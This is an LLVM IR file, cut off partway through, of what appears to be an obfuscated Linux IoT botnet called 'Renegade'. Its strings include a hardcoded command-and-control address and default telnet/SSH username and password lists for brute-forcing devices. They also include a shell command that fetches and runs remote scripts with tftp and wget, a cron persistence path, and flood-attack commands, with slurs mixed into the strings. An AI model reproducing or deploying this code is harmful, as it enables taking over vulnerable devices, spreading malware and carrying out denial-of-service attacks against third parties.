; ModuleID = 'host/ir_bcf/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %47, %1
  %11 = load i32, i32* @x
  %12 = load i32, i32* @y
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  %21 = load i32, i32* @x
  %22 = load i32, i32* @y
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %50

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* %3, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %3, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %3, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %3, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %10

; <label>:50:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %51 = load i32, i32* %3, align 4
  %52 = icmp slt i32 %51, 4096
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = shl i32 %61, 1
  %_1 = sub i32 0, %61
  %gen = add i32 %_1, 1
  %_2 = sub i32 %61, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 0, %61
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %61
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %61
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %61, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 %61, 1
  %gen13 = mul i32 %_12, 1
  %_14 = shl i32 %61, 1
  %62 = add i32 %61, 1
  %_15 = sub i32 %62, 4095
  %gen16 = mul i32 %_15, 4095
  %_17 = shl i32 %62, 4095
  %_18 = shl i32 %62, 4095
  %_19 = sub i32 %62, 4095
  %gen20 = mul i32 %_19, 4095
  %_21 = shl i32 %62, 4095
  %_22 = sub i32 %62, 4095
  %gen23 = mul i32 %_22, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_24 = sub i64 %64, %69
  %gen25 = mul i64 %_24, %69
  %_26 = sub i64 %64, %69
  %gen27 = mul i64 %_26, %69
  %_28 = sub i64 %64, %69
  %gen29 = mul i64 %_28, %69
  %_30 = sub i64 %64, %69
  %gen31 = mul i64 %_30, %69
  %_32 = sub i64 %64, %69
  %gen33 = mul i64 %_32, %69
  %_34 = sub i64 0, %64
  %gen35 = add i64 %_34, %69
  %_36 = shl i64 %64, %69
  %_37 = sub i64 0, %64
  %gen38 = add i64 %_37, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_39 = sub i64 0, %74
  %gen40 = add i64 %_39, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_41 = sub i64 0, %77
  %gen42 = add i64 %_41, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.3
  %21 = load i32, i32* @y.4
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @x.3
  %31 = load i32, i32* @y.4
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:38:                                     ; preds = %10
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* @x.3
  %41 = load i32, i32* @y.4
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %39
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp sge i32 %48, %49
  %51 = load i32, i32* @x.3
  %52 = load i32, i32* @y.4
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %50, label %59, label %68

; <label>:59:                                     ; preds = %originalBBpart211
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = call i32 @isspace(i32 %65) #10
  %67 = icmp ne i32 %66, 0
  br label %68

; <label>:68:                                     ; preds = %59, %originalBBpart211
  %69 = phi i1 [ false, %originalBBpart211 ], [ %67, %59 ]
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %68
  %71 = load i32, i32* %5, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %5, align 4
  br label %39

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* %4, align 4
  store i32 %74, i32* %3, align 4
  br label %75

; <label>:75:                                     ; preds = %originalBBpart226, %73
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %5, align 4
  %78 = icmp sle i32 %76, %77
  br i1 %78, label %79, label %110

; <label>:79:                                     ; preds = %75
  %80 = load i8*, i8** %2, align 8
  %81 = load i32, i32* %3, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = load i8*, i8** %2, align 8
  %86 = load i32, i32* %3, align 4
